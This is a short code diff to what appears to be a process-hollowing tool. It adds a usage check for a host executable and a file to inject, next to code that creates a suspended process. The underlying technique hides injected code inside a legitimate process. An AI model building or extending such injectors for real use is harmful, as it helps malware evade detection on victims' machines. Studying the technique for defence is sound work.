@@ -18,6 +18,11 @@ typedef struct BASE_RELOCATION_ENTRY {
 
 int main(int argc, char *argv[]) {
 
+	if (argc != 3){
+		printf("Usage: Process Hollowing.exe [Host.exe] [Inject]\n");
+		return 0;
+	}
+
 	// Creating Susspended Proccess And Mapping a File To Memory
 	LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
 	PROCESS_INFORMATION proc_info;
